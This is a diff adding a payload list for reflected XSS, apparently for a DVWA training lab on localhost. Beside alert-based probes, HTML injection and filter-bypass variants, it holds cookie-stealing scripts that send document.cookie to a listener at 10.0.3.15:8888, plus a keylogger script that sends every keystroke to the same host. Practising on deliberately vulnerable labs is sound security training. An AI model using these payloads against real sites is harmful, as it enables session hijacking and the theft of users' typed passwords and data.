@@ -1,0 +1,32 @@
+# XSS Payloads — DVWA Lab
+# Used against: http://localhost/dvwa/vulnerabilities/xss_r/?name=<PAYLOAD>
+
+# --- Basic confirmation ---
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+
+# --- HTML injection ---
+<h1>Hacked</h1>
+<b>Bold Injection</b>
+<marquee>Scrolling Injection</marquee>
+<img src=x onerror=alert(1)>
+
+# --- Cookie theft ---
+<script>document.location='http://10.0.3.15:8888/?c='+document.cookie</script>
+<script>new Image().src='http://10.0.3.15:8888/?c='+document.cookie</script>
+<img src=x onerror="document.location='http://10.0.3.15:8888/?c='+document.cookie">
+
+# --- Filter bypass attempts (for Medium/High security) ---
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<SCRIPT>alert(1)</SCRIPT>
+<img src="javascript:alert(1)">
+"><script>alert(1)</script>
+';alert(1);//
+
+# --- Keylogger skeleton ---
+<script>
+document.onkeypress = function(e) {
+  new Image().src = 'http://10.0.3.15:8888/log?k=' + e.key;
+}
+</script>
